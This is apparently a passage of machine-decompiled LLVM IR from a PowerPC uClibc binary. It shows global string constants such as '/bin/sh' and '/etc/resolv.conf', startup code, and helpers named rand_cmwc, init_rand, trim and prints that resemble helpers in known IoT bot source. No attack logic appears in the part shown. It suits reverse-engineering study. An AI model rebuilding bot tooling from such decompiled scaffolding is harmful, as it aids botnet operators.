@global_var_1000e0b4.586 = constant [3 x i8] c" c\00"
@global_var_10019560.587 = constant i32 0
@global_var_1002a830.588 = global i32 0
@global_var_1002a848.589 = global i32 0
@global_var_1002ab90.590 = global i32* bitcast (i16* @global_var_1002a860.581 to i32*)
@global_var_10011770.591 = constant [3 x i8] c"8`\00"
@global_var_1000e400.592 = constant i32 1207961092
@global_var_1000e52c.593 = constant i32 1207960768
@global_var_10019594.594 = constant i32 269488136
@global_var_10019578.595 = constant [6 x i8] c"(nil)\00"
@global_var_10019580.596 = constant [7 x i8] c"(null)\00"
@global_var_10019588.597 = constant i32 721431808
@global_var_1000e988.598 = constant i32 939524096
@global_var_10019614.599 = constant i32 65793
@global_var_100195fc.600 = constant i32 524293
@global_var_100195f4.601 = constant [8 x i8] c" +0-#'I\00"
@global_var_1001959c.602 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_100195dc.603 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_100195d0.604 = constant i32 67343
@global_var_100195cf.605 = constant i32 50331911
@global_var_100195c0.606 = constant i32 268435461
@global_var_100195b0.607 = constant i32 520093701
@global_var_1000f330.608 = constant i32 939589631
@global_var_1000f3e4.609 = constant i32 939524118
@global_var_10019630.610 = constant [8 x i8] c"Success\00"
@global_var_10019620.611 = constant [15 x i8] c"Unknown error \00"
@global_var_1001a36a.612 = constant i32 1
@global_var_1002aba4.613 = local_unnamed_addr global i32* @global_var_1001a36a.612
@global_var_1002abe8.614 = global i32 0
@global_var_1001a214.615 = constant [15 x i8] c"Resolver error\00"
@global_var_1001a194.616 = constant [8 x i8] c"Error 0\00"
@global_var_1001a19c.617 = constant [13 x i8] c"Unknown host\00"
@global_var_1001a1ac.618 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_1001a1c8.619 = constant [21 x i8] c"Unknown server error\00"
@global_var_1001a1e0.620 = constant [32 x i8] c"No address associated with name\00"
@global_var_1001a200.621 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1001a194.616, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1001a19c.617, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_1001a1ac.618, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_1001a1c8.619, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1001a1e0.620, i32 0, i32 0)]
@global_var_1001a226.622 = constant i32 0
@global_var_1001a224.623 = constant [3 x i8] c": \00"
@global_var_1001a18c.624 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_10030c48.625 = global i32 0
@global_var_10030e24.626 = global i32 0
@global_var_10030c58.627 = global i32 0
@global_var_1002ab28.628 = global i32 0
@global_var_1002ac14.629 = local_unnamed_addr global i32 0
@global_var_10030f10.630 = global i32 0
@global_var_100101b4.631 = constant [3 x i8] c"8`\00"
@global_var_10010298.632 = constant i32 939524098
@global_var_100102d8.633 = constant [3 x i8] c"8`\00"
@global_var_100104e0.634 = constant i32 939524118
@global_var_10010568.635 = constant i32 939524118
@global_var_10030e68.636 = global i32 0
@global_var_10030e38.637 = global i32 0
@global_var_1002ab98 = external global i32
@global_var_1002abf8.640 = local_unnamed_addr global i32 0
@global_var_10030ee8.641 = global i32 0
@global_var_100107c4.642 = constant i32 939524108
@global_var_1001085c.643 = constant [3 x i8] c"8`\00"
@global_var_10010a64.644 = constant i32 1207959640
@global_var_10010aa0.645 = constant i32 1207959580
@global_var_1002aa58.646 = global i32 0
@global_var_1002aa70 = external global i32
@global_var_1002aa90.648 = global i32 -1726662223
@global_var_1002aa78.649 = local_unnamed_addr global i32* @global_var_1002aa90.648
@global_var_1002aa74.650 = global i32* @global_var_1002aa90.648
@global_var_1001a228.651 = constant i32 0
@global_var_10010db8.652 = constant i32 939524118
@global_var_1001a250.653 = constant [8 x i8] c"/bin/sh\00"
@global_var_1001a258.654 = constant [3 x i8] c"sh\00"
@global_var_1001a25c.655 = constant [3 x i8] c"-c\00"
@global_var_1001110c.656 = constant [3 x i8] c"8`\00"
@global_var_10011320.657 = constant i32 939524130
@global_var_1002ab0c.658 = global i32 0
@global_var_1002abec.659 = local_unnamed_addr global i32 0
@global_var_100113b4.660 = constant i32 1207960361
@global_var_1002abf4.661 = local_unnamed_addr global i32 0
@global_var_1002a69c.662 = global i32 -1
@global_var_1002abfc.663 = local_unnamed_addr global i32 0
@global_var_1002ac00.664 = local_unnamed_addr global i32 0
@global_var_1001a260.665 = constant [10 x i8] c"/dev/null\00"
@global_var_1002ac04.666 = local_unnamed_addr global i32 0
@global_var_1002abf0.667 = local_unnamed_addr global i32 0
@global_var_10011a88.668 = constant i32 939524096
@global_var_10011aa4.669 = constant i32 939524096
@global_var_1002ac28.670 = local_unnamed_addr global i32 0
@global_var_1002ac0c.671 = global i32 0
@global_var_10011e18.672 = constant i32 939524180
@global_var_100121b4.673 = constant i32 939524105
@global_var_1001a598.674 = constant [4 x i8] c"inf\00"
@global_var_1001a59b.676 = constant i32 4804166
@global_var_1001a5a8.677 = constant i32 771763200
@global_var_10030e50.679 = global i32 0
@global_var_1002ac10.680 = local_unnamed_addr global i32 0
@global_var_10013030.682 = constant i32 1207960848
@global_var_1002ac18.683 = local_unnamed_addr global i32 0
@global_var_1001a5f8.684 = constant i32 771751936
@global_var_10030f00.685 = global i32 0
@global_var_10013120.686 = constant [3 x i8] c"8a\00"
@global_var_1001312c.687 = constant i32 939524097
@global_var_10013200.688 = constant i32 939524097
@global_var_100132d4.689 = constant i32 939524097
@global_var_10013300.690 = constant i32 939524100
@global_var_100133e0.691 = constant i32 1207959684
@global_var_1001355c.692 = constant i32 939589631
@global_var_1001a614.693 = constant i32 1912602624
@global_var_1001a600.694 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1001a618.695 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1001a630.696 = constant [11 x i8] c"nameserver\00"
@global_var_1001a63c.697 = constant [7 x i8] c"domain\00"
@global_var_1001a644.698 = constant [7 x i8] c"search\00"
@global_var_10013894.699 = constant i32 1207959568
@global_var_1001389c.700 = constant i32 939524099
@global_var_1002ab40.701 = global i32 0
@global_var_100139fc.702 = constant i32 939524129
@global_var_1002ac1c.703 = local_unnamed_addr global i32 0
@global_var_10013a70.704 = constant [3 x i8] c"8`\00"
@global_var_10013aa8.705 = constant i32 939524129
@global_var_1002ac20.706 = local_unnamed_addr global i32 0
@global_var_1002ac24.707 = local_unnamed_addr global i32 0
@global_var_1002abe0.708 = local_unnamed_addr global i32 0
@global_var_10013d40.710 = constant i32 1207961081
@global_var_10013f68.711 = constant i32 939524171
@global_var_10013ff8.712 = constant i32 1207960120
@global_var_1002ab94.713 = local_unnamed_addr global i32 2
@global_var_1001422c.714 = constant i32 1207959560
@global_var_1001450c.715 = constant i32 1207959708
@global_var_100145b4.716 = constant i32 1207959612
@global_var_100149ac.717 = constant [3 x i8] c"8`\00"
@global_var_1001a660.718 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_10014ba4.719 = constant [3 x i8] c"9 \00"
@global_var_10014bb0.720 = constant i32 939524193
@global_var_10014c18.722 = constant i32 939524101
@global_var_10014d04.723 = constant i32 939524124
@global_var_10014d7c.724 = constant i32 1207960116
@global_var_10014d94.725 = constant i32 939524105
@global_var_10014f0c.726 = constant [3 x i8] c"9 \00"
@global_var_1001a674.727 = constant [3 x i8] c"%x\00"
@global_var_10014f98.728 = constant i32 939524124
@global_var_10014fbc.729 = constant i32 939524193
@global_var_1001a678.730 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1001a684.731 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_100156a8.732 = constant i32 1207959560
@global_var_10015740.733 = constant i32 939589631
@global_var_10015c24.734 = constant i32 939524105
@global_var_1002a6a0.735 = global i32 0
@global_var_1002ac2c.2 = local_unnamed_addr global i8 0
@global_var_1002abc0.43 = external global i8*
@global_var_1002abc1.44 = local_unnamed_addr global i8 0
@global_var_1002abc2.45 = local_unnamed_addr global i8 0
@global_var_1002abc3.46 = local_unnamed_addr global i8 0
@global_var_1002abc4.47 = local_unnamed_addr global i8 0
@global_var_1002a860.581 = global i16 288
@global_var_1002a8b0.582 = local_unnamed_addr global i16 272
@global_var_1002abe4.709 = local_unnamed_addr global i16* null
@global_var_1002ab24.681 = local_unnamed_addr global i16 1
@global_var_10018f58.572 = constant [2 x i8] c"r\00"

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 268435620, i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1002ac2c.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1002a6b4.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1002a6b4.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1002a6b4.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1002ac2c.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1002ac2c.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1002a6ac.8, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1002a6ac.8 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268487540, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268524788, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002ac48.9, align 4
  %v1_10000260 = add i32 %arg1, -1640531527
  store i32 %v1_10000260, i32* @global_var_1002ac4c.10, align 4
  %v1_10000278 = add i32 %arg1, 1013904242
  store i32 %v1_10000278, i32* @global_var_1002ac50.11, align 4
  br label %dec_label_pc_10000294

dec_label_pc_10000294:                            ; preds = %entry, %dec_label_pc_10000294
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_100002fc, %dec_label_pc_10000294 ]
  %v1_1000029c = mul i32 %storemerge12, 4
  %v2_100002ac = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_1002ac48.9 to i32), i32 -12)
  %v1_100002b0 = inttoptr i32 %v2_100002ac to i32*
  %v2_100002b0 = load i32, i32* %v1_100002b0, align 4
  %v2_100002c8 = add i32 %v1_1000029c, add (i32 ptrtoint (i32* @global_var_1002ac48.9 to i32), i32 -8)
  %v1_100002cc = inttoptr i32 %v2_100002c8 to i32*
  %v2_100002cc = load i32, i32* %v1_100002cc, align 4
  %v2_100002d0 = xor i32 %storemerge12, -1640531527
  %v2_100002d8 = xor i32 %v2_100002d0, %v2_100002b0
  %v1_100002e0 = xor i32 %v2_100002d8, %v2_100002cc
  %v2_100002f0 = add i32 %v1_1000029c, ptrtoint (i32* @global_var_1002ac48.9 to i32)
  %v2_100002f4 = inttoptr i32 %v2_100002f0 to i32*
  store i32 %v1_100002e0, i32* %v2_100002f4, align 4
  %v1_100002fc = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_100002fc, 4096
  br i1 %tmp7, label %dec_label_pc_10000294, label %dec_label_pc_10000310

dec_label_pc_10000310:                            ; preds = %dec_label_pc_10000294
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000029c, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10000294, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  store i32 18782, i32* %r10.global-to-local, align 4
  %v3_10000348 = load i32, i32* @global_var_1002a748.12, align 4
  %v1_1000034c = add i32 %v3_10000348, 1
  %v1_10000350 = urem i32 %v1_1000034c, 4096
  store i32 %v1_10000350, i32* @global_var_1002a748.12, align 4
  %v1_1000036c = mul nuw nsw i32 %v1_10000350, 4
  %v2_10000370 = add i32 %v1_1000036c, ptrtoint (i32* @global_var_1002ac48.9 to i32)
  %v1_10000374 = inttoptr i32 %v2_10000370 to i32*
  %v2_10000374 = load i32, i32* %v1_10000374, align 4
  %v6_10000398 = udiv i32 %v2_10000374, 228675
  %v2_1000039c = mul i32 %v2_10000374, 18782
  %v3_100003ac = load i32, i32* @global_var_1002a744.13, align 4
  %v2_100003b8 = add i32 %v3_100003ac, %v2_1000039c
  %v3_100003b8 = icmp ult i32 %v2_100003b8, %v3_100003ac
  %v4_100003bc = zext i1 %v3_100003b8 to i32
  %v5_100003bc = add nuw nsw i32 %v4_100003bc, %v6_10000398
  store i32 %v5_100003bc, i32* %r10.global-to-local, align 4
  %v2_100003ec = add i32 %v5_100003bc, %v2_100003b8
  %v2_10000400 = icmp ult i32 %v2_100003ec, %v5_100003bc
  br i1 %v2_10000400, label %dec_label_pc_10000408, label %dec_label_pc_10000428

dec_label_pc_10000408:                            ; preds = %entry
  %v1_1000040c = add i32 %v2_100003ec, 1
  %v1_1000041c = add nuw nsw i32 %v5_100003bc, 1
  br label %dec_label_pc_10000428

dec_label_pc_10000428:                            ; preds = %entry, %dec_label_pc_10000408
  %storemerge = phi i32 [ %v1_1000041c, %dec_label_pc_10000408 ], [ %v5_100003bc, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_1000040c, %dec_label_pc_10000408 ], [ %v2_100003ec, %entry ]
  store i32 %storemerge, i32* @global_var_1002a744.13, align 4
  store i32 %v1_10000350, i32* %r10.global-to-local, align 4
  %v2_10000438 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10000438, i32* %v1_10000374, align 4
  %v0_10000458 = load i32, i32* %r10.global-to-local, align 4
  %v1_10000458 = mul i32 %v0_10000458, 4
  %v2_1000045c = add i32 %v1_10000458, ptrtoint (i32* @global_var_1002ac48.9 to i32)
  %v1_10000460 = inttoptr i32 %v2_1000045c to i32*
  %v2_10000460 = load i32, i32* %v1_10000460, align 4
  ret i32 %v2_10000460

; uselistorder directives
  uselistorder i32 %v5_100003bc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v3_100003ac, { 1, 0 }
  uselistorder i32 %v2_10000374, { 1, 0 }
  uselistorder i32 %v1_10000350, { 2, 0, 1 }
  uselistorder i32* @global_var_1002ac48.9, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002ac48.9 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10000428, { 1, 0 }
}

define i32 @trim(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_1000049c = call i32 @__GI_strlen()
  store i32 %v0_1000049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100004c0

dec_label_pc_100004b4:                            ; preds = %dec_label_pc_100004c0
  %v1_100004b8 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_100004c0

dec_label_pc_100004c0:                            ; preds = %entry, %dec_label_pc_100004b4
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100004b8, %dec_label_pc_100004b4 ]
  %v2_100004cc = add i32 %stack_var_-36.0, %arg1
  %v3_100004cc = inttoptr i32 %v2_100004cc to i8*
  %v3_100004d0 = load i8, i8* %v3_100004cc, align 1
  %v4_100004d0 = zext i8 %v3_100004d0 to i32
  store i32 %v4_100004d0, i32* %r3.global-to-local, align 4
  %v3_100004e0 = call i32 @isspace(i32 %v4_100004d0, i32 %v2_100004cc)
  store i32 %v3_100004e0, i32* %r3.global-to-local, align 4
  %v3_100004e8 = icmp eq i32 %v3_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000500.preheader, label %dec_label_pc_100004b4

dec_label_pc_10000500.preheader:                  ; preds = %dec_label_pc_100004c0
  %v1_100004a8 = add i32 %v0_1000049c, -1
  %v2_100005087 = icmp slt i32 %v1_100004a8, %stack_var_-36.0
  br i1 %v2_100005087, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_100004f4:                            ; preds = %dec_label_pc_10000510
  %v1_100004f8 = add i32 %stack_var_-40.010, -1
  %v2_10000508 = icmp slt i32 %v1_100004f8, %stack_var_-36.0
  br i1 %v2_10000508, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_10000500.preheader, %dec_label_pc_100004f4
  %stack_var_-40.010 = phi i32 [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %v1_100004a8, %dec_label_pc_10000500.preheader ]
  %v2_1000051c = add i32 %stack_var_-40.010, %arg1
  %v3_1000051c = inttoptr i32 %v2_1000051c to i8*
  %v3_10000520 = load i8, i8* %v3_1000051c, align 1
  %v4_10000520 = zext i8 %v3_10000520 to i32
  store i32 %v4_10000520, i32* %r3.global-to-local, align 4
  %v3_10000530 = call i32 @isspace(i32 %v4_10000520, i32 %v2_1000051c)
  store i32 %v3_10000530, i32* %r3.global-to-local, align 4
  %v3_10000538 = icmp eq i32 %v3_10000530, 0
  br i1 %v3_10000538, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_100004f4

dec_label_pc_1000058c.preheader:                  ; preds = %dec_label_pc_100004f4, %dec_label_pc_10000510, %dec_label_pc_10000500.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_100004a8, %dec_label_pc_10000500.preheader ], [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %stack_var_-40.010, %dec_label_pc_10000510 ]
  %v3_100005943 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100005943, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_1000058c.preheader, %dec_label_pc_1000054c
  %v2_100005b06 = phi i32 [ %v2_100005b0, %dec_label_pc_1000054c ], [ %arg1, %dec_label_pc_1000058c.preheader ]
  %storemerge15 = phi i32 [ %v1_10000584, %dec_label_pc_1000054c ], [ %stack_var_-36.0, %dec_label_pc_1000058c.preheader ]
  %v2_10000570 = add i32 %storemerge15, %arg1
  %v1_10000574 = inttoptr i32 %v2_10000570 to i8*
  %v2_10000574 = load i8, i8* %v1_10000574, align 1
  %v3_1000057c = inttoptr i32 %v2_100005b06 to i8*
  store i8 %v2_10000574, i8* %v3_1000057c, align 1
  %v1_10000584 = add i32 %storemerge15, 1
  %v3_10000594 = icmp sgt i32 %v1_10000584, %stack_var_-40.0.lcssa
  %v2_100005a4 = sub i32 %v1_10000584, %stack_var_-36.0
  %v2_100005b0 = add i32 %v2_100005a4, %arg1
  br i1 %v3_10000594, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_1000054c, %dec_label_pc_1000058c.preheader
  %v2_100005b0.lcssa = phi i32 [ %arg1, %dec_label_pc_1000058c.preheader ], [ %v2_100005b0, %dec_label_pc_1000054c ]
  %v3_100005b8 = inttoptr i32 %v2_100005b0.lcssa to i8*
  store i8 0, i8* %v3_100005b8, align 1
  %v0_100005d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100005d0

; uselistorder directives
  uselistorder i32 %v1_10000584, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100004a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 5, 3, 6, 4, 0 }
  uselistorder i32 (i32, i32)* @isspace, { 1, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000054c, { 1, 0 }
  uselistorder label %dec_label_pc_1000058c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000510, { 1, 0 }
  uselistorder label %dec_label_pc_100004c0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100005e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100005f4 = icmp eq i32 %v0_100005e8, 0
  br i1 %v3_100005f4, label %dec_label_pc_10000628, label %dec_label_pc_100005fc

dec_label_pc_100005fc:                            ; preds = %entry
  %v1_10000600 = inttoptr i32 %v0_100005e8 to i32*
  %v2_10000600 = load i32, i32* %v1_10000600, align 4
  %v1_1000060c = trunc i32 %arg2 to i8
  %v3_1000060c = inttoptr i32 %v2_10000600 to i8*
  store i8 %v1_1000060c, i8* %v3_1000060c, align 1
  %v2_10000614 = load i32, i32* %v1_10000600, align 4
  %v1_10000618 = add i32 %v2_10000614, 1
  store i32 %v1_10000618, i32* %v1_10000600, align 4
  %v0_10000650.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_10000628:                            ; preds = %entry
  %v2_10000628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437052, i32* @lr, align 4
  %v2_10000638 = call i32 @__libc_write(i32 1, i32 %v2_10000628)
  store i32 %v2_10000638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_1000063c:                            ; preds = %dec_label_pc_100005fc, %dec_label_pc_10000628
  %v0_10000650 = phi i32 [ %v0_10000650.pre, %dec_label_pc_100005fc ], [ %v2_10000638, %dec_label_pc_10000628 ]
  ret i32 %v0_10000650

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000063c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp46 = icmp slt i32 %arg3, 1
  br i1 %tmp46, label %dec_label_pc_10000718, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %entry
  %v2_100006c427 = load i8, i8* %arg2, align 1
  %v3_100006cc30 = icmp eq i8 %v2_100006c427, 0
  br i1 %v3_100006cc30, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006a8:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_100006a8
  %v4_100006c032 = phi i32 [ %v1_100006b8, %dec_label_pc_100006a8 ], [ %tmp, %dec_label_pc_10000694 ]
  %stack_var_-20.031 = phi i32 [ %v1_100006ac, %dec_label_pc_100006a8 ], [ 0, %dec_label_pc_10000694 ]
  %v1_100006ac = add i32 %stack_var_-20.031, 1
  %v1_100006b8 = add i32 %v4_100006c032, 1
  %v5_100006bc = inttoptr i32 %v1_100006b8 to i8*
  %v2_100006c4 = load i8, i8* %v5_100006bc, align 1
  %v3_100006cc = icmp eq i8 %v2_100006c4, 0
  br i1 %v3_100006cc, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006d4:                            ; preds = %dec_label_pc_100006a8, %dec_label_pc_10000694
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000694 ], [ %v1_100006ac, %dec_label_pc_100006a8 ]
  %v2_100006dc = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_100006dc, label %dec_label_pc_100006f0, label %dec_label_pc_10000700

dec_label_pc_100006f0:                            ; preds = %dec_label_pc_100006d4
  %v2_100006f8 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000700

dec_label_pc_10000700:                            ; preds = %dec_label_pc_100006d4, %dec_label_pc_100006f0
  %storemerge4 = phi i32 [ %v2_100006f8, %dec_label_pc_100006f0 ], [ 0, %dec_label_pc_100006d4 ]
  %v1_10000704 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000708 = icmp eq i32 %v1_10000704, 0
  br i1 %v3_10000708, label %dec_label_pc_10000718, label %dec_label_pc_10000710

dec_label_pc_10000710:                            ; preds = %dec_label_pc_10000700
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000700, %entry, %dec_label_pc_10000710
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_10000700 ], [ %storemerge4, %dec_label_pc_10000710 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000700 ], [ 48, %dec_label_pc_10000710 ]
  %v1_1000071c = urem i32 %arg4, 2
  %v3_10000720 = icmp eq i32 %v1_1000071c, 0
  br i1 %v3_10000720, label %dec_label_pc_10000750.preheader, label %dec_label_pc_10000790.preheader

dec_label_pc_10000750.preheader:                  ; preds = %dec_label_pc_10000718
  %v2_1000075420 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000075420, label %dec_label_pc_1000072c.lr.ph, label %dec_label_pc_10000790.preheader

dec_label_pc_1000072c.lr.ph:                      ; preds = %dec_label_pc_10000750.preheader
  %v2_10000734 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000072c

dec_label_pc_1000072c:                            ; preds = %dec_label_pc_1000072c.lr.ph, %dec_label_pc_1000072c
  %stack_var_-32.123 = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000072c.lr.ph ], [ %v1_10000748, %dec_label_pc_1000072c ]
  %v3_10000734 = call i32 @printchar(i32* %v2_10000734, i32 %stack_var_-16.0)
  %v1_10000748 = add nsw i32 %stack_var_-32.123, -1
  %v2_10000754 = icmp sgt i32 %stack_var_-32.123, 1
  br i1 %v2_10000754, label %dec_label_pc_1000072c, label %dec_label_pc_10000790.preheader

dec_label_pc_10000790.preheader:                  ; preds = %dec_label_pc_1000072c, %dec_label_pc_10000750.preheader, %dec_label_pc_10000718
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000718 ], [ 0, %dec_label_pc_10000750.preheader ], [ %stack_var_-32.0, %dec_label_pc_1000072c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000718 ], [ %stack_var_-32.0, %dec_label_pc_10000750.preheader ], [ 0, %dec_label_pc_1000072c ]
  %v2_1000079411 = load i8, i8* %arg2, align 1
